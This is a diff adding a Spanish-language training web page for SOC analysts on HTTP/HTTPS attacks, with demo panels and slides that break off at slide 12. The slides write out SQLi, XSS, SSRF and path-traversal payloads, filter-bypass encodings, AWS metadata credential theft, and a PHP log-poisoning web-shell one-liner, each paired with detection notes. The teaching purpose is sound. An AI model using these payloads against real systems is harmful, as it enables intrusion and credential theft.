@@ -1,0 +1,1269 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTTP/HTTPS — Protocolos SOC</title>
+  <meta name="description" content="HTTP/HTTPS: cómo funciona el tráfico web, ataques comunes (SQLi, XSS, Session Hijacking) y cómo detectarlos en un SOC." />
+  <link rel="stylesheet" href="../styles.css" />
+  <link rel="stylesheet" href="../boton-dubstep.css" />
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml" />
+  <style> :root { --proto-color: #00d4ff; } </style>
+  <script>
+    (function(){
+      const t = localStorage.getItem('protocolos-soc-theme') || 'vision-ui';
+      document.documentElement.setAttribute('data-theme', t);
+    })();
+  </script>
+</head>
+<body class="page-wrapper">
+
+  <!-- Header -->
+  <header class="site-header">
+    <div class="container">
+      <a href="../index.html" class="site-logo">
+        <span class="logo-icon">🛡️</span>
+        <span>Protocolos<span class="accent">SOC</span></span>
+      </a>
+      <nav class="header-nav">
+        <a href="https://github.com/xavimape/protocolos-red-soc" target="_blank" rel="noopener" data-i18n="nav.github">GitHub</a>
+      </nav>
+      <div class="ui-controls">
+        <a href="../index.html" class="back-to-hub"><span class="back-arrow">←</span> <span data-i18n="nav.back">Inicio</span></a>
+        <select class="theme-select" id="theme-select" title="Cambiar tema"></select>
+        <button class="ctrl-btn" id="lang-toggle" title="Switch to English" onclick="i18n.toggleLang()">EN</button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Module header -->
+  <div class="module-header">
+    <div class="container">
+      <div class="module-breadcrumb">
+        <a href="../index.html">Hub</a>
+        <span class="sep">›</span>
+        <span>HTTP/HTTPS</span>
+      </div>
+      <div class="module-title-row">
+        <div class="module-number-badge">2</div>
+        <div>
+          <div class="module-title">HTTP / HTTPS</div>
+          <div class="module-subtitle" data-i18n="http.subtitle">Protocolo de Transferencia de Hipertexto · TCP/80,443 · Capa de Aplicación</div>
+        </div>
+      </div>
+      <nav class="tabs-nav">
+        <button class="tab-btn active" data-tab="demo"       onclick="SOC.switchTab('http','demo')">        <span data-i18n="tab.demo">🧪 Demo Lab</span></button>
+        <button class="tab-btn"        data-tab="teoria"     onclick="SOC.switchTab('http','teoria')">      <span data-i18n="tab.teoria">📖 Teoría</span></button>
+        <button class="tab-btn"        data-tab="ejercicios" onclick="SOC.switchTab('http','ejercicios')">  <span data-i18n="tab.ejercicios">✏️ Ejercicios</span></button>
+        <button class="tab-btn"        data-tab="recursos"   onclick="SOC.switchTab('http','recursos')">    <span data-i18n="tab.recursos">📚 Recursos</span></button>
+      </nav>
+    </div>
+  </div>
+
+  <!-- Contenido -->
+  <main class="container">
+
+    <!-- ── Tab: Demo Lab ── -->
+    <div class="tab-content active" data-tab="demo">
+
+      <!-- Demo 1: Request/Response HTTP -->
+      <div class="demo-container">
+        <div class="demo-panel">
+          <div class="demo-panel-header">
+            <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+            <span class="panel-title" data-i18n="http.demo.sim.panel.title">Simulador HTTP Request</span>
+            <span class="badge badge-info">TCP/80,443</span>
+          </div>
+          <div class="demo-panel-body">
+            <div class="demo-input-group">
+              <label data-i18n="http.demo.sim.label.url">URL objetivo:</label>
+              <input type="text" id="http-url" value="https://bank.example.com/login" />
+            </div>
+            <div class="demo-input-group">
+              <label data-i18n="http.demo.sim.label.method">Método HTTP:</label>
+              <select id="http-method">
+                <option value="GET"    data-i18n="http.demo.sim.opt.get">GET — Obtener recurso</option>
+                <option value="POST" selected data-i18n="http.demo.sim.opt.post">POST — Enviar datos</option>
+                <option value="PUT"    data-i18n="http.demo.sim.opt.put">PUT — Actualizar recurso</option>
+                <option value="DELETE" data-i18n="http.demo.sim.opt.delete">DELETE — Eliminar recurso</option>
+              </select>
+            </div>
+            <div class="demo-input-group">
+              <label data-i18n="http.demo.sim.label.body">Body (POST):</label>
+              <input type="text" id="http-body" value="username=admin&password=secret123" />
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="httpDemo.sendRequest()" data-i18n="http.demo.sim.btn.send">▶ Enviar Request</button>
+              <button class="btn btn-secondary" onclick="httpDemo.reset()" data-i18n="btn.reset">↺ Reset</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="demo-panel">
+          <div class="demo-panel-header">
+            <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+            <span class="panel-title">Response + Headers</span>
+          </div>
+          <div class="demo-panel-body">
+            <div class="demo-output" id="http-output">
+              <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="http.demo.sim.waiting">Esperando request HTTP...</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 2: XSS -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="http.demo.xss.title">⚠️ Demo: Cross-Site Scripting (XSS)</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="http.demo.xss.desc">
+          El atacante inyecta código JavaScript en un campo que se renderiza sin sanitizar.
+          Comparación en tiempo real: input con y sin protección.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.xss.panel.unsafe">🔴 Sin sanitización (vulnerable)</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="http.demo.xss.label.input">Comentario del usuario:</label>
+                <input type="text" id="xss-input" value='Hola! <script>alert("XSS")</script>' />
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="httpDemo.runXSS()" data-i18n="http.demo.xss.btn.render">▶ Renderizar</button>
+              </div>
+              <div style="margin-top:1rem;">
+                <label style="font-size:0.78rem;color:var(--text-muted);font-family:var(--font-mono);" data-i18n="http.demo.xss.label.unsafe">Output HTML sin sanitizar:</label>
+                <div id="xss-output-unsafe" style="
+                  background:var(--bg-code);border:1px solid var(--danger);border-radius:var(--radius);
+                  padding:0.75rem;margin-top:0.35rem;font-size:0.82rem;font-family:var(--font-mono);
+                  color:var(--danger);min-height:48px;
+                ">...</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.xss.panel.safe">🟢 Con sanitización (protegido)</span>
+            </div>
+            <div class="demo-panel-body">
+              <div style="margin-top:0.35rem;">
+                <label style="font-size:0.78rem;color:var(--text-muted);font-family:var(--font-mono);" data-i18n="http.demo.xss.label.fn">Función de sanitización:</label>
+                <pre style="font-size:0.78rem;margin-top:0.35rem;">function sanitize(input) {
+  return input
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;');
+}</pre>
+              </div>
+              <div style="margin-top:0.75rem;">
+                <label style="font-size:0.78rem;color:var(--text-muted);font-family:var(--font-mono);" data-i18n="http.demo.xss.label.safe">Output HTML sanitizado:</label>
+                <div id="xss-output-safe" style="
+                  background:var(--bg-code);border:1px solid var(--success);border-radius:var(--radius);
+                  padding:0.75rem;margin-top:0.35rem;font-size:0.82rem;font-family:var(--font-mono);
+                  color:var(--success);min-height:48px;
+                ">...</div>
+              </div>
+              <div class="demo-output" id="xss-log" style="min-height:80px;margin-top:0.75rem;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 3: SQL Injection -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="http.demo.sqli.title">⚠️ Demo: SQL Injection</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="http.demo.sqli.desc">
+          El atacante rompe la lógica de la query SQL manipulando el input del formulario de login.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.sqli.panel.form">Formulario de Login</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label style="font-size:0.8rem;color:var(--text-muted);font-family:var(--font-mono);">Variante de ataque:</label>
+                <select id="sqli-variant" onchange="httpDemo.loadSQLiVariant()" style="margin-top:0.3rem;">
+                  <option value="bypass">Auth Bypass — comment injection (admin' --)</option>
+                  <option value="or1">Boolean Always-True — OR '1'='1'</option>
+                  <option value="union" data-i18n="http.opt1">UNION SELECT — extracción de datos</option>
+                  <option value="blind" data-i18n="http.opt2">Blind SQLi — condición booleana</option>
+                  <option value="time">Time-Based Blind — SLEEP/WAITFOR</option>
+                  <option value="drop" data-i18n="http.opt3">DROP TABLE — destructivo</option>
+                  <option value="legit" data-i18n="http.opt4">✅ Input legítimo (sin inyección)</option>
+                </select>
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="http.demo.sqli.label.user">Usuario:</label>
+                <input type="text" id="sqli-user" value="admin' --" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="http.demo.sqli.label.pass">Contraseña:</label>
+                <input type="text" id="sqli-pass" value="cualquier_cosa" />
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="httpDemo.runSQLi()" data-i18n="http.demo.sqli.btn.try">▶ Intentar Login</button>
+                <button class="btn btn-secondary" onclick="httpDemo.resetSQLi()" data-i18n="http.demo.sqli.btn.reset">↺ Probar legítimo</button>
+              </div>
+            </div>
+          </div>
+
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.sqli.panel.result">Query generada + Resultado</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="sqli-output" style="min-height:160px;">
+                <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="http.demo.sqli.waiting">Esperando intento de login...</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 4: CSRF -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="http.demo.csrf.title">🎭 Demo: CSRF — Cross-Site Request Forgery</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="http.demo.csrf.desc">
+          Una página maliciosa fuerza al navegador de la víctima a ejecutar acciones no autorizadas.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.csrf.panel.legit">🟢 Request legítimo</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="http.demo.csrf.label.amount">Monto a transferir:</label>
+                <input type="number" id="csrf-amount" value="500" min="1" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="http.demo.csrf.label.dest">Cuenta destino:</label>
+                <input type="text" id="csrf-dest" value="ES7621000418401234567891" />
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="httpDemo.runCSRFLegit()" data-i18n="http.demo.csrf.btn.legit">✅ Enviar legítimo</button>
+                <button class="btn btn-secondary" onclick="httpDemo.runCSRFAttack()" data-i18n="http.demo.csrf.btn.attack">💀 Ejecutar CSRF</button>
+              </div>
+            </div>
+          </div>
+
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.csrf.panel.attack">🔴 Request CSRF</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="csrf-output" style="min-height:200px;">
+                <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="http.demo.waiting">Elige una acción para comparar...</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 5: Session Hijacking -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="http.demo.session.title">🍪 Demo: Session Hijacking (Cookie Theft)</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="http.demo.session.desc">
+          El atacante roba la cookie de sesión vía XSS o sniffing para suplantar a la víctima.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.session.panel.cookie">🍪 Configuración de cookie</span>
+            </div>
+            <div class="demo-panel-body">
+              <div style="width:100%;">
+                <label style="font-size:0.8rem;color:var(--text-muted);font-family:var(--font-mono);letter-spacing:0.05em;" data-i18n="http.demo.session.label.flags">Flags de la cookie:</label>
+                <div style="display:flex;flex-direction:column;gap:0.55rem;margin-top:0.6rem;width:100%;">
+                  <label style="display:flex;align-items:center;gap:0.6rem;font-size:0.85rem;cursor:pointer;width:100%;">
+                    <input type="checkbox" id="flag-httponly" checked style="flex-shrink:0;width:15px;height:15px;cursor:pointer;" />
+                    <code style="white-space:nowrap;">HttpOnly</code>
+                    <span style="color:var(--text-muted);font-size:0.75rem;">— bloquea acceso JS</span>
+                  </label>
+                  <label style="display:flex;align-items:center;gap:0.6rem;font-size:0.85rem;cursor:pointer;width:100%;">
+                    <input type="checkbox" id="flag-secure" checked style="flex-shrink:0;width:15px;height:15px;cursor:pointer;" />
+                    <code style="white-space:nowrap;">Secure</code>
+                    <span style="color:var(--text-muted);font-size:0.75rem;">— solo HTTPS</span>
+                  </label>
+                  <label style="display:flex;align-items:center;gap:0.6rem;font-size:0.85rem;cursor:pointer;width:100%;">
+                    <input type="checkbox" id="flag-samesite" checked style="flex-shrink:0;width:15px;height:15px;cursor:pointer;" />
+                    <code style="white-space:nowrap;">SameSite=Strict</code>
+                    <span style="color:var(--text-muted);font-size:0.75rem;">— bloquea CSRF</span>
+                  </label>
+                </div>
+              </div>
+              <div class="btn-row" style="margin-top:1rem;">
+                <button class="btn btn-primary" onclick="httpDemo.runSessionHijack()" data-i18n="http.demo.session.btn.analyze">🔍 Analizar vulnerabilidad</button>
+                <button class="btn btn-secondary" onclick="httpDemo.resetSession()" data-i18n="btn.reset">↺ Reset</button>
+              </div>
+            </div>
+          </div>
+
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.session.panel.result">🔍 Análisis de riesgo</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="session-output" style="min-height:220px;">
+                <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="http.demo.waiting2">Configura los flags y analiza...</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- Demo 5: SSRF -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="http.demo.ssrf.title">🌐 Demo: SSRF — Server-Side Request Forgery</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="http.demo.ssrf.desc">
+          El servidor hace una petición HTTP en nombre del atacante. Permite acceder a recursos internos, metadata cloud, o servicios no expuestos a Internet.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.ssrf.panel">Configurar SSRF</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="http.demo.ssrf.endpoint">Endpoint vulnerable:</label>
+                <input type="text" id="ssrf-endpoint" value="https://app.empresa.com/fetch?url=" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="http.demo.ssrf.target">Objetivo SSRF:</label>
+                <select id="ssrf-target">
+                  <option value="metadata" selected>AWS Metadata (169.254.169.254)</option>
+                  <option value="internal" data-i18n="http.opt5">API interna (10.0.0.5:8080)</option>
+                  <option value="redis" data-i18n="http.opt6">Redis sin auth (127.0.0.1:6379)</option>
+                  <option value="file" data-i18n="http.opt7">Lectura de archivo (file:///etc/passwd)</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="httpDemo.runSSRF()" data-i18n="http.demo.ssrf.btn">▶ Ejecutar SSRF</button>
+                <button class="btn btn-secondary" onclick="httpDemo.resetSSRF()" data-i18n="btn.reset">↺ Reset</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.ssrf.result">Respuesta del servidor</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="ssrf-output" style="min-height:200px;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 6: Path Traversal / LFI -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="http.demo.lfi.title">📂 Demo: Path Traversal / LFI</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="http.demo.lfi.desc">
+          Manipulación de rutas de archivo para acceder a archivos fuera del directorio permitido. ../../../etc/passwd es el ejemplo clásico.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.lfi.panel">Configurar Path Traversal</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="http.demo.lfi.param">Parámetro vulnerable:</label>
+                <input type="text" id="lfi-param" value="?page=about" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="http.demo.lfi.target">Archivo objetivo:</label>
+                <select id="lfi-target">
+                  <option value="passwd" selected data-i18n="http.opt8">/etc/passwd (usuarios del sistema)</option>
+                  <option value="shadow" data-i18n="http.opt9">/etc/shadow (hashes de contraseñas)</option>
+                  <option value="config" data-i18n="http.opt10">config.php (credenciales DB)</option>
+                  <option value="logs">/var/log/apache2/access.log (log poisoning)</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="httpDemo.runLFI()" data-i18n="http.demo.lfi.btn">▶ Ejecutar LFI</button>
+                <button class="btn btn-secondary" onclick="httpDemo.resetLFI()" data-i18n="btn.reset">↺ Reset</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.lfi.result">Contenido del archivo</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="lfi-output" style="min-height:200px;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 7: XXE -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="http.demo.xxe.title">📄 Demo: XXE — XML External Entity</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="http.demo.xxe.desc">
+          Si el servidor parsea XML sin deshabilitar entidades externas, el atacante puede leer archivos, hacer SSRF, o causar DoS (Billion Laughs).
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.xxe.panel">Configurar XXE</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="http.demo.xxe.type">Tipo de ataque XXE:</label>
+                <select id="xxe-type">
+                  <option value="file" selected>File read (/etc/passwd)</option>
+                  <option value="ssrf" data-i18n="http.opt11">SSRF via XXE (http://interno/)</option>
+                  <option value="oob" data-i18n="http.opt12">Out-of-band exfiltración</option>
+                  <option value="dos">Billion Laughs (DoS)</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="httpDemo.runXXE()" data-i18n="http.demo.xxe.btn">▶ Ejecutar XXE</button>
+                <button class="btn btn-secondary" onclick="httpDemo.resetXXE()" data-i18n="btn.reset">↺ Reset</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="http.demo.xxe.result">Respuesta del servidor</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="xxe-output" style="min-height:200px;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /tab demo -->
+
+    <!-- ── Tab: Teoría ── -->
+    <div class="tab-content" data-tab="teoria">
+      <div class="slides-container" id="http-slides">
+
+        <div class="slide active">
+          <span class="slide-number">1 / 12</span>
+          <h2 data-i18n="http.s1.title">¿Qué es HTTP/HTTPS?</h2>
+          <p class="slide-subtitle" data-i18n="http.s1.sub">El protocolo que mueve la web</p>
+          <p data-i18n="http.s1.p1"></p>
+          <p data-i18n="http.s1.p2"></p>
+          <div class="callout" data-i18n="http.s1.callout"></div>
+          <ul>
+            <li data-i18n="http.s1.li1"></li>
+            <li data-i18n="http.s1.li2"></li>
+            <li data-i18n="http.s1.li3"></li>
+          </ul>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">2 / 12</span>
+          <h2 data-i18n="http.s2.title">Estructura de un mensaje HTTP</h2>
+          <p class="slide-subtitle" data-i18n="http.s2.sub">Request y Response</p>
+          <pre>
+── REQUEST ──────────────────────────────────────
+POST /login HTTP/1.1
+Host: bank.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Cookie: session=abc123
+
+username=admin&password=secret
+
+── RESPONSE ─────────────────────────────────────
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=xyz789; HttpOnly; Secure
+X-Frame-Options: DENY
+Strict-Transport-Security: max-age=31536000
+
+&lt;html&gt;...&lt;/html&gt;</pre>
+          <div class="callout" data-i18n="http.s2.callout"></div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">3 / 12</span>
+          <h2 data-i18n="http.s3.title">Métodos HTTP y códigos de estado</h2>
+          <p class="slide-subtitle" data-i18n="http.s3.sub">Lo que un SOC debe conocer</p>
+          <ul>
+            <li data-i18n="http.s3.li1"></li>
+            <li data-i18n="http.s3.li2"></li>
+            <li data-i18n="http.s3.li3"></li>
+            <li data-i18n="http.s3.li4"></li>
+            <li data-i18n="http.s3.li5"></li>
+          </ul>
+          <div class="callout warning" data-i18n="http.s3.callout"></div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">4 / 12</span>
+          <h2 data-i18n="http.s4.title">Ataque 1: SQL Injection (SQLi)</h2>
+          <p class="slide-subtitle" data-i18n="http.s4.sub">Romper la lógica de la base de datos via input</p>
+          <p data-i18n="http.s4.p1"></p>
+          <ul>
+            <li data-i18n="http.s4.li1"></li>
+            <li data-i18n="http.s4.li2"></li>
+            <li data-i18n="http.s4.li3"></li>
+          </ul>
+          <div class="callout danger" data-i18n="http.s4.callout"></div>
+          <p data-i18n="http.s4.p2"></p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">5 / 12</span>
+          <h2 data-i18n="http.s5.title">Ataque 2: Cross-Site Scripting (XSS)</h2>
+          <p class="slide-subtitle" data-i18n="http.s5.sub">Inyección de JavaScript en páginas web</p>
+          <p data-i18n="http.s5.p1"></p>
+          <ul>
+            <li data-i18n="http.s5.li1"></li>
+            <li data-i18n="http.s5.li2"></li>
+            <li data-i18n="http.s5.li3"></li>
+          </ul>
+          <div class="callout danger" data-i18n="http.s5.callout"></div>
+          <p data-i18n="http.s5.p2"></p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">6 / 12</span>
+          <h2 data-i18n="http.s6.title">Ataque 3: Session Hijacking</h2>
+          <p class="slide-subtitle" data-i18n="http.s6.sub">Robo del identificador de sesión</p>
+          <p data-i18n="http.s6.p1"></p>
+          <p data-i18n="http.s6.p2"></p>
+          <ul>
+            <li data-i18n="http.s6.li1"></li>
+            <li data-i18n="http.s6.li2"></li>
+            <li data-i18n="http.s6.li3"></li>
+            <li data-i18n="http.s6.li4"></li>
+          </ul>
+          <div class="callout warning" data-i18n="http.s6.callout"></div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">7 / 12</span>
+          <h2 data-i18n="http.s7.title">Ataque 4: Descarga de Archivos Maliciosos</h2>
+          <p class="slide-subtitle" data-i18n="http.s7.sub">HTTP como vector de entrega de malware</p>
+          <p data-i18n="http.s7.p1"></p>
+          <ul>
+            <li data-i18n="http.s7.li1"></li>
+            <li data-i18n="http.s7.li2"></li>
+            <li data-i18n="http.s7.li3"></li>
+            <li data-i18n="http.s7.li4"></li>
+          </ul>
+          <div class="callout danger" data-i18n="http.s7.callout"></div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">8 / 12</span>
+          <h2 data-i18n="http.s8.title">Cómo se ve en telemetría SOC</h2>
+          <p class="slide-subtitle" data-i18n="http.s8.sub">HTTP en logs de proxy, Zeek y SIEM</p>
+          <pre>
+# Zeek http.log — request normal
+ts=10:00:01  method=POST  host=bank.example.com
+uri=/login   status_code=200  resp_body_len=1248
+user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+
+# Zeek http.log — posible SQLi (500 + uri sospechoso)
+ts=10:02:14  method=GET
+uri=/search?q=1'+OR+'1'='1  status_code=500
+user_agent="sqlmap/1.7.8"
+
+# Zeek http.log — posible C2 (User-Agent hardcodeado)
+ts=10:05:33  method=GET  host=185.220.101.45
+uri=/update  status_code=200  resp_body_len=98304
+user_agent="Mozilla/4.0 (compatible; MSIE 6.0)"
+
+# Suricata — alerta XSS en URL
+alert http any any -> any 80 (
+  msg:"XSS attempt in URI";
+  http.uri; content:"&lt;script"; nocase;
+  classtype:web-application-attack; sid:2100001;)</pre>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">9 / 12</span>
+          <h2 data-i18n="http.s9.title">Detección y mitigación</h2>
+          <p class="slide-subtitle" data-i18n="http.s9.sub">Resumen operativo para SOC</p>
+          <ul>
+            <li data-i18n="http.s9.li1"></li>
+            <li data-i18n="http.s9.li2"></li>
+            <li data-i18n="http.s9.li3"></li>
+            <li data-i18n="http.s9.li4"></li>
+            <li data-i18n="http.s9.li5"></li>
+            <li data-i18n="http.s9.li6"></li>
+            <li data-i18n="http.s9.li7"></li>
+            <li data-i18n="http.s9.li8"></li>
+          </ul>
+          <div class="callout" data-i18n="http.s9.callout"></div>
+        </div>
+
+      
+
+        <div class="slide">
+          <span class="slide-number">10 / 12</span>
+          <h2 data-i18n="http.s10.title">Ataque 5: SSRF (Server-Side Request Forgery)</h2>
+          <p class="slide-subtitle" data-i18n="http.s10.sub">El servidor hace peticiones HTTP en nombre del atacante</p>
+          <p data-i18n="http.s10.p1">SSRF ocurre cuando la aplicación acepta una URL del usuario y hace una petición desde el servidor. El atacante apunta a recursos internos no accesibles desde Internet: APIs internas, metadata de cloud, bases de datos, o servicios como Redis.</p>
+          <pre data-i18n="http.pre3">
+VECTOR TÍPICO:
+  GET /fetch?url=https://example.com/image.jpg HTTP/1.1
+  → El servidor hace la petición en nombre del usuario
+
+PAYLOAD SSRF — AWS Metadata:
+  GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role
+  Response: {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
+  → Credenciales IAM completas → acceso a S3, EC2, RDS
+
+PAYLOAD SSRF — Redis sin auth:
+  GET /fetch?url=dict://127.0.0.1:6379/info
+  → Dump de configuración Redis → SET commands → RCE
+
+BYPASS DE FILTROS:
+  Filtro: bloquea "169.254.169.254"
+  Bypass: http://169.254.169.254  → http://0xa9fea9fe → http://2852039166
+  Bypass: http://evil.com → DNS resuelve a 169.254.169.254 (DNS rebinding)
+  Bypass: http://[::ffff:169.254.169.254] (IPv6)
+
+BLIND SSRF:
+  Sin respuesta visible — usar Burp Collaborator o interactsh
+  El servidor hace la petición pero no devuelve el resultado
+  Detectar via: DNS lookup, TCP connect, timing differences
+
+DETECCIÓN:
+  WAF: bloquear IPs RFC1918 y 169.254.x.x en parámetros URL
+  Logs: peticiones salientes desde servidores de app a IPs internas
+  SIEM: EC2 haciendo requests a 169.254.169.254 sin agente legítimo</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">OWASP Top 10 #10 (2021) · MITRE ATT&CK: <strong>T1090</strong> — Proxy · <strong>T1552.005</strong> — Cloud Instance Metadata</p>
+        </div>
+
+
+        <div class="slide">
+          <span class="slide-number">11 / 12</span>
+          <h2 data-i18n="http.s11.title">Ataque 6: Path Traversal / LFI</h2>
+          <p class="slide-subtitle" data-i18n="http.s11.sub">Acceder a archivos fuera del directorio web raíz</p>
+          <p data-i18n="http.s11.p1">Path Traversal permite navegar fuera del directorio permitido usando secuencias "../". LFI (Local File Inclusion) permite incluir archivos del servidor como código PHP. Ambos pueden escalar a RCE con log poisoning.</p>
+          <pre data-i18n="http.pre4">
+PAYLOAD BÁSICO:
+  GET /download?file=../../../etc/passwd HTTP/1.1
+  → root:x:0:0:root:/root:/bin/bash
+  → www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+BYPASS DE FILTROS:
+  Filtro: reemplaza "../" con ""  →  ....// (nested)
+  Filtro: bloquea "/" absoluto    →  ..%2F..%2Fetc%2Fpasswd
+  Filtro: valida extensión .php   →  ../../../etc/passwd%00.php (null byte)
+  Filtro: reemplaza solo 1 vez    →  ..././..././etc/passwd
+
+ESCALADA A RCE — Log Poisoning:
+  1. Inyectar PHP en User-Agent:
+     User-Agent: <?php system($_GET['cmd']); ?>
+  2. El server guarda el log: /var/log/apache2/access.log
+  3. LFI sobre el log:
+     GET /page?file=../../../var/log/apache2/access.log&cmd=id
+  → uid=33(www-data) gid=33(www-data)  ← RCE conseguido
+
+ARCHIVOS SENSIBLES (Linux):
+  /etc/passwd          → usuarios del sistema
+  /etc/shadow          → hashes de contraseñas (requiere root)
+  /proc/self/environ   → variables de entorno del proceso
+  ~/.ssh/id_rsa        → clave privada SSH
+  /var/www/html/config.php → credenciales de base de datos
+
+DETECCIÓN:
+  WAF: secuencias ../ en parámetros GET/POST
+  Logs: accesos a /etc/, /proc/, /var/log/ desde la app web
+  SIEM: alerta en GET params con %2e%2e o ../</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">OWASP A01:2021 · MITRE ATT&CK: <strong>T1083</strong> — File and Directory Discovery · <strong>T1059</strong> — Command Execution</p>
+        </div>
+
+
+        <div class="slide">
+          <span class="slide-number">12 / 12</span>
+          <h2 data-i18n="http.s12.title">Ataque 7: XXE — XML External Entity</h2>
